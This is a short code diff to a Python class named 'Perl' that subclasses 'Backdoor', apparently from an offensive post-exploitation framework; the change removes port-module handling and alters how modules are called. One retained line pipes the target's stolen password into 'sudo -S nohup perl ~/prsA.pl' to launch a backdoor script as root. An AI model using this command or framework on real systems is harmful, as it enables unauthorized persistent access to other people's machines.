@@ -12,11 +12,6 @@ class Perl(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {} 
-	self.portModules = {}
-
-   
-    def get_port(self):
-        return self.get_value("port")
  
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup perl ~/prsA.pl"
@@ -48,10 +43,7 @@ class Perl(Backdoor):
 
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_command())
-	for mod in self.portModules.keys():
-            print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_port())
+            mod.exploit()
 
 
 
